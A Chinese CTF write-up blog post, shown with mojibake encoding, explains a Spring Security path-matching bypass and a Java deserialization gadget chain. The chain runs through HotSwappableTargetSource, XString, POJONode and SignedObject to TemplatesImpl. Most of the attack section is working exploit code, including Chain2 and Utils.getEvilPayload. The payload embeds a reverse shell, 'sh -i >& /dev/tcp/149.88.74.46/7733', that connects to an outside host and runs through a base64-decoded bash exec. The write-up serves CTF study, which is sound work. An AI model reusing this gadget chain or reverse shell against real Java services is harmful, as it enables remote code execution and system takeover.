<!DOCTYPE html>
<html lang="ch">
  <head>
    

    
<script>!function(){document.documentElement.classList.toggle("dark",!0)}()</script>
    

<meta charset="utf-8" >

<title>2024æµ™æ±Ÿçœèµ›secObj</title>
<meta name="keywords" content="2024æµ™æ±Ÿçœèµ›secObj, root@debian:~#">
<meta name="description" content="2023æµ™æ±Ÿå¤§å­¦ç”Ÿçœèµ›å†³èµ› secObjå‚è€ƒï¼šhttps://www.yuque.com/dat0u/ctf/zticsggntervfyue ï¼ˆå…³æ³¨å¤§å¤´ï¼Œè°¢è°¢å–µ
é¢˜ç›®åœ°å€ 
è€ƒå¯ŸçŸ¥è¯†ç‚¹ï¼š
Javaä»£ç å®¡è®¡ã€Spring Securityæƒ">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta property="og:title" content="2024æµ™æ±Ÿçœèµ›secObj">
<meta property="og:description" content="2023æµ™æ±Ÿå¤§å­¦ç”Ÿçœèµ›å†³èµ› secObjå‚è€ƒï¼šhttps://www.yuque.com/dat0u/ctf/zticsggntervfyue ï¼ˆå…³æ³¨å¤§å¤´ï¼Œè°¢è°¢å–µ
é¢˜ç›®åœ°å€ 
è€ƒå¯ŸçŸ¥è¯†ç‚¹ï¼š
Javaä»£ç å®¡è®¡ã€Spring Securityæƒ">

<link rel="shortcut icon" href="/images/favicon.ico">
<link rel="stylesheet" href="/style/main.css">

  <link rel="stylesheet" href="/style/simple-lightbox.min.css"><meta name="generator" content="Hexo 7.3.0"></head>
  <body>
    <div id="app" class="main">

<div class="site-header-container">
  <div class="site-header">
    <div class="left">
      <a href="https://y1shiny1shin.github.io">
        <img class="avatar" src="https://q.qlogo.cn/g?b=qq&amp;nk=2729913542&amp;s=100" alt="logo" width="32px" height="32px">
      </a>
      <a href="https://y1shiny1shin.github.io">
        <h1 class="site-title">root@debian:~#</h1>
      </a>
    </div>
    <div class="right">
        <i class="icon menu-switch icon-menu-outline" ></i>
    </div>
  </div>
</div>

<div class="menu-container" style="height: 0;opacity: 0;">
<nav class="menu-list">
  
    
      <a href="/" class="menu purple-link">
        é¦–é¡µ
      </a>
    
  
    
      <a href="/tags" class="menu purple-link">
        æ ‡ç­¾
      </a>
    
  
    
      <a href="/archives" class="menu purple-link">
        å½’æ¡£
      </a>
    
  
    
      <a href="/about" class="menu purple-link">
        å…³äº
      </a>
    
  
</nav>
</div>



  <div class="content-container">
    <div class="post-detail">
      
      <h2 class="post-title">2024æµ™æ±Ÿçœèµ›secObj</h2>
      <div class="post-info post-detail-info">
        <span><i class="icon icon-calendar-outline"></i> 2024-11-09</span>
        
          <span>
          <i class="icon icon-pricetags-outline"></i>
            
              <a href="/tags/Java/">
              Java
                
              </a>
            
          </span>
        
      </div>
      <div class="post-content-wrapper">
        <div class="post-content">
          <h1 id="2023æµ™æ±Ÿå¤§å­¦ç”Ÿçœèµ›å†³èµ›-secObj"><a href="#2023æµ™æ±Ÿå¤§å­¦ç”Ÿçœèµ›å†³èµ›-secObj" class="headerlink" title="2023æµ™æ±Ÿå¤§å­¦ç”Ÿçœèµ›å†³èµ› secObj"></a>2023æµ™æ±Ÿå¤§å­¦ç”Ÿçœèµ›å†³èµ› secObj</h1><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.yuque.com/dat0u/ctf/zticsggntervfyue">https://www.yuque.com/dat0u/ctf/zticsggntervfyue</a> ï¼ˆå…³æ³¨å¤§å¤´ï¼Œè°¢è°¢å–µ</p>
<p><a target="_blank" rel="noopener" href="https://github.com/y1shiny1shin/CTF-Java/blob/main/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97/2023%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9B/demo-0.0.1-SNAPSHOT.jar">é¢˜ç›®åœ°å€ </a></p>
<p>è€ƒå¯ŸçŸ¥è¯†ç‚¹ï¼š</p>
<p><code>Javaä»£ç å®¡è®¡ã€Spring Securityæƒé™éªŒè¯ç»•è¿‡ã€HotSwappableTargetSourceç»•è¿‡é»‘åå•ã€SignedObjectäºŒæ¬¡ååºåˆ—åŒ–</code></p>
<p>æ­ä¸€ä¸ªåŸæœ¬ç¯å¢ƒå¯ä»¥å»å¤§å¤´çš„è¯­é›€</p>
<h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><h4 id="Spring-Security-åŸºæœ¬ç”¨æ³•"><a href="#Spring-Security-åŸºæœ¬ç”¨æ³•" class="headerlink" title="Spring Security åŸºæœ¬ç”¨æ³•"></a>Spring Security åŸºæœ¬ç”¨æ³•</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dw3306/p/12751373.html">https://www.cnblogs.com/dw3306/p/12751373.html</a></p>
<p>é¦–å…ˆéœ€è¦é‡å†™ä¸¤ä¸ªconfigureå‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(AuthenticationManagerBuilder auth)</span></span><br></pre></td></tr></table></figure>

<p>ç”¨æ¥é…ç½®ç”¨æˆ·å’Œå¯¹åº”çš„è§’è‰²</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(HttpSecurity http)</span></span><br></pre></td></tr></table></figure>

<p>ç”¨æ¥é…ç½®URLçš„è®¿é—®æƒé™</p>
<p><code>antMatchers()</code> å‡½æ•°ç”¨æ¥é…ç½®å¯¹åº”çš„URLï¼Œå«æœ‰ä¸‰ç§è¯­æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">? åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦</span><br><span class="line">* åŒ¹é…0ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</span><br><span class="line">** åŒ¹é…0ä¸ªæˆ–å¤šä¸ªç›®å½•</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªåœ°æ–¹å°±ä¼šå­˜åœ¨æƒé™ç»•è¿‡ï¼Œä¾‹å¦‚</p>
<p>å¦‚æœè®¾ç½®<code>antMatchers(&quot;admin/*&quot;)</code> ï¼Œåªä¼šåŒ¹é…ä¸€ä¸ªç›®å½•ï¼Œä¹Ÿå°±æ˜¯è¯´</p>
<p><code>admin/hello</code> ä¼šè¢«åŒ¹é…ï¼Œè€Œ<code>admin/hello/</code> åˆ™ä¸ä¼šè¢«åŒ¹é…ï¼Œå¯¼è‡´æƒé™ç»•è¿‡</p>
<p>è¿™ç¯‡æ–‡ç« è®²çš„æ›´ç»†èŠ‚  <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13235">https://xz.aliyun.com/t/13235</a></p>
<h3 id="é“¾å­"><a href="#é“¾å­" class="headerlink" title="é“¾å­"></a>é“¾å­</h3><p>è¿™é‡Œåªå†™é“¾å­éƒ¨åˆ†ï¼›</p>
<p>ç®€å•åˆ†æä¸€ä¸‹ä»£ç ï¼Œæ²¡ä»€ä¹ˆç‰¹æ®Šçš„ä¾èµ–</p>
<p>é»‘åå•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] blackList = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">    <span class="string">&quot;AbstractTranslet&quot;</span>, </span><br><span class="line">    <span class="string">&quot;Templates&quot;</span>, </span><br><span class="line">    <span class="string">&quot;TemplatesImpl&quot;</span>, </span><br><span class="line">    <span class="string">&quot;javax.management&quot;</span>, </span><br><span class="line">    <span class="string">&quot;swing&quot;</span>, </span><br><span class="line">    <span class="string">&quot;awt&quot;</span>, </span><br><span class="line">    <span class="string">&quot;fastjson&quot;</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>é‚£å°±åªèƒ½æ‰“ <code>SignedObject</code> äºŒæ¬¡ååºåˆ—åŒ–äº†</p>
<p>é‚£ <code>SignedObject#getObject</code> åˆç”±è°æ¥æ‰“</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„æ²¡æœ‰ban jackson ï¼Œé‚£å°±å¯ä»¥ç”¨ <code>POJONode#toString</code> æ¥æ‰“ï¼Œè¿™ä¸ªæ–¹æ³•å¯ä»¥éå†æ‰§è¡Œå¯¹è±¡ä¸­çš„æ‰€æœ‰ <code>getter</code></p>
<p>é‚£ä¹ˆç”±è°æ¥è§¦å‘ <code>toString</code> ï¼ŒXStringå†å¥½ä¸è¿‡äº†ï¼Œå› ä¸ºè¿™é‡Œæ²¡ban</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.aop.target.HotSwappableTargetSource</span><br><span class="line">com.sun.org.apache.xpath.internal.objects.XString</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆå°±å¯ä»¥ç”¨è¿™ä¸ªè§¦å‘ç¬¬äºŒæ®µ</p>
<p>æœ€åçš„é“¾å­ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">java.util.HashMap#readObject(ObjectInputStream s)</span><br><span class="line">java.util.HashMap#putVal(int hash, K key, V value, boolean onlyIfAbsent,boolean evict)</span><br><span class="line">org.springframework.aop.target.HotSwappableTargetSource#equals(Object other)</span><br><span class="line">com.sun.org.apache.xpath.internal.objects.XString#equals(Object obj2)</span><br><span class="line">com.fasterxml.jackson.databind.node.POJONode#toString()</span><br><span class="line">java.security.SignedObject#getObject()</span><br><span class="line">javax.management.BadAttributeValueExpException#readObject()</span><br><span class="line">com.fasterxml.jackson.databind.node.POJONode#toString()</span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties()</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­çš„ <code>POJONode#toString()</code> æ²¡æœ‰è¯¥æ–¹æ³•ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨ä»–çš„çˆ¶ç±» <code>BaseJsonNode#toString()</code></p>
<p>ä½†æ˜¯ä»–çš„çˆ¶ç±»å«æœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object writeReplace() &#123;</span><br><span class="line">    return NodeSerialization.from(this);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å¦‚æœä¸€ä¸ªåºåˆ—åŒ–ç±»ä¸­å«æœ‰Object writeReplace()æ–¹æ³•ï¼Œé‚£ä¹ˆå®é™…åºåˆ—åŒ–çš„å¯¹è±¡å°†æ˜¯ä½œä¸ºwriteReplaceæ–¹æ³•è¿”å›å€¼çš„å¯¹è±¡ï¼Œè€Œä¸”åºåˆ—åŒ–è¿‡ç¨‹çš„ä¾æ®æ˜¯å®é™…è¢«åºåˆ—åŒ–å¯¹è±¡çš„åºåˆ—åŒ–å®ç°ã€‚</p>
</blockquote>
<p>é‚£ä¹ˆè¿™ä¸ªä»£ç å°±ä¼šå¯¼è‡´åºåˆ—åŒ–å¤±è´¥ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨JarEditorç›´æ¥æ³¨é‡Šæ‰ï¼Œä½†æ˜¯ä¸å»ºè®®è¿™ä¹ˆåšï¼Œå› ä¸ºå¤ªç²—é²äº†ğŸ¥¹</p>
<p>é‚£ä¹ˆä¹…ç”¨ javassist åšä¸€ä¸ªå’Œä»–ä¸€æ ·çš„ç±»å°±å¥½äº†ï¼Œè¿™ä¸ªæ–¹æ³•ä¸ä¼šä¿®æ”¹åŸæœ¬çš„ä»£ç ï¼Œä¼šä¿®æ”¹JVMå†…å­˜ä¸­çš„å­—èŠ‚ç ï¼Œå°† <code>CtClass</code> å¯¹è±¡è½¬æ¢æˆä¸€ä¸ªæ–°çš„ <code>Class</code> å¯¹è±¡å¹¶åŠ è½½åˆ°å½“å‰ç±»åŠ è½½å™¨ä¸­ï¼Œè¿™æ®µä»£ç ç›´æ¥æŠ„çš„å¤§å¤´çš„</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass0</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line"><span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass0.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">ctClass0.removeMethod(writeReplace);</span><br><span class="line">ctClass0.toClass();</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">package com;</span><br><span class="line"></span><br><span class="line">import com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import javassist.CtMethod;</span><br><span class="line">import org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line">import org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.security.KeyPair;</span><br><span class="line">import java.security.KeyPairGenerator;</span><br><span class="line">import java.security.Signature;</span><br><span class="line">import java.security.SignedObject;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class Chain2 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // åˆ é™¤ BaseJsonNode#writeReplace æ–¹æ³•</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass ctClass0 = pool.get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);</span><br><span class="line">        CtMethod writeReplace = ctClass0.getDeclaredMethod(&quot;writeReplace&quot;);</span><br><span class="line">        ctClass0.removeMethod(writeReplace);</span><br><span class="line">        ctClass0.toClass();</span><br><span class="line"></span><br><span class="line">        // è·å–æ¶æ„å­—èŠ‚ç </span><br><span class="line">        byte[] bytes = Utils.getEvilPayload(&quot;sh -i &gt;&amp; /dev/tcp/149.88.74.46/7733 0&gt;&amp;1&quot;);</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        Utils.setValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);</span><br><span class="line">        Utils.setValue(templates, &quot;_name&quot;, &quot;aaa&quot;);</span><br><span class="line">        Utils.setValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        POJONode pojoNode = new POJONode(templates);</span><br><span class="line">        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);</span><br><span class="line">        Utils.setValue(bad, &quot;val&quot;, pojoNode);</span><br><span class="line"></span><br><span class="line">        // ç”Ÿæˆå…¬é’¥</span><br><span class="line">        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);</span><br><span class="line">        keyPairGenerator.initialize(1024);</span><br><span class="line">        KeyPair keyPair = keyPairGenerator.generateKeyPair();</span><br><span class="line">        SignedObject signedObject = new SignedObject(</span><br><span class="line">                bad,</span><br><span class="line">                keyPair.getPrivate(),</span><br><span class="line">                Signature.getInstance(&quot;DSA&quot;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        POJONode outerNode = new POJONode(signedObject);</span><br><span class="line"></span><br><span class="line">        HotSwappableTargetSource h1 = new HotSwappableTargetSource(outerNode);</span><br><span class="line">        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString(&quot;aaa&quot;));</span><br><span class="line">        HashMap hashMap = Utils.makeMap(h1 ,h2);</span><br><span class="line"></span><br><span class="line">        Utils.serialize(hashMap, &quot;payload.ser&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Utils.serialize</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object ,String filename)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(barr.toByteArray())));</span><br><span class="line">        System.out.println(<span class="string">&quot;====================================&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(filename);</span><br><span class="line">        barr.writeTo(fos);</span><br><span class="line">        fos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>Utils.getEvilPayload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmdBase64</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(cmd.getBytes()));</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">evilBlock</span> <span class="operator">=</span> String.format(</span><br><span class="line">                <span class="string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,%s&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>,</span><br><span class="line">                cmdBase64);</span><br><span class="line">        clazz.makeClassInitializer().insertBefore(evilBlock);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>Utils.makeMap ç”¨åšè·å–ä¸€ä¸ªHashMapï¼Œé¿å…ç›´æ¥putæ·»åŠ å…ƒç´ çš„æ—¶å€™ï¼Œè§¦å‘å‘½ä»¤ï¼Œå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°†ç”Ÿæˆçš„base64å»æ‰“è¿›ç¯å¢ƒï¼Œæ‰“çš„æ—¶å€™ï¼Œè®°å¾—urlç¼–ç ä¸€ä¸‹</p>
<p>æ‰“è¿›å»åï¼Œè¿”å›äº†ä¸€ä¸ªé”™è¯¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.fasterxml.jackson.databind.JsonMappingException: com.fasterxml.jackson.databind.JsonMappingException: (was java.lang.NullPointerException) (through reference chain: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl[&quot;stylesheetDOM&quot;]) (through reference chain: java.security.SignedObject[&quot;object&quot;])</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹å¯¹åº”çš„ä»£ç ï¼Œ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">ThreadLocal</span> <span class="variable">_sdom</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>();</span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> DOM <span class="title function_">getStylesheetDOM</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (DOM)_sdom.get();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯è°ƒç”¨äº† <code>getStylesheetDOM</code> ä½†æ˜¯å…¶ä¸­çš„ <code>_sdom</code> ä¸ºç©ºï¼Œåˆå› ä¸ºè¯¥å±æ€§ä¸º <code>transient</code> ï¼Œæ‰€ä»¥æ²¡åŠæ³•é€šè¿‡åå°„ä¿®æ”¹è¿™ä¸ªå±æ€§</p>
<blockquote>
<ol>
<li><p>transientå…³é”®å­—çš„ç”¨é€”<br>ç”¨äºåœ¨å®ç°Serializableæ¥å£çš„ç±»ä¸­æ ‡è®°æˆå‘˜å˜é‡ï¼Œä½¿è¯¥ç±»å¯¹è±¡åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¿½ç•¥è¯¥æˆå‘˜å˜é‡çš„å¤„ç†ã€‚</p>
</li>
<li><p>transientåºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­çš„å¤„ç†æ–¹å¼<br>åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œtransientå…³é”®å­—ä¿®é¥°çš„æˆå‘˜å˜é‡é»˜è®¤å¤„ç†æ–¹å¼ä½¿ç›´æ¥å¿½ç•¥<br>åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œtransientå…³é”®å­—ä¿®é¥°çš„æˆå‘˜å˜é‡é»˜è®¤èµ‹å€¼è¯¥æˆå‘˜å˜é‡ç±»å‹çš„é»˜è®¤å€¼ï¼Œä¾‹å¦‚intå‹ä¸º0ï¼Œbooleanä¸ºfalseï¼Œå¯¹è±¡ç±»å‹ä¸ºnullã€‚</p>
</li>
</ol>
</blockquote>
<p>æ‰€ä»¥æ²¡åŠæ³•é€šè¿‡è¿™ä¸ªæ–¹æ³•ä¿®æ”¹</p>
<p>é‚£å°±åªèƒ½è®¾ç½®ä¸€ä¸ªä»£ç†ï¼Œå¯¹åº”çš„æ¥å£åªåŒ…å« <code>getOutputProperties()</code> æ–¹æ³•çš„</p>
<p>é‚£ä¹ˆå°±åªèƒ½æ˜¯ <code>javax.xml.transform.Templates</code> äº†</p>
<p>è®¾ç½®ä»£ç†éƒ¨åˆ† <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12846">https://xz.aliyun.com/t/12846</a></p>
<p>é‚£ä¹ˆå°†ä¸Šé¢çš„ç»„åˆä¸€ä¸‹</p>
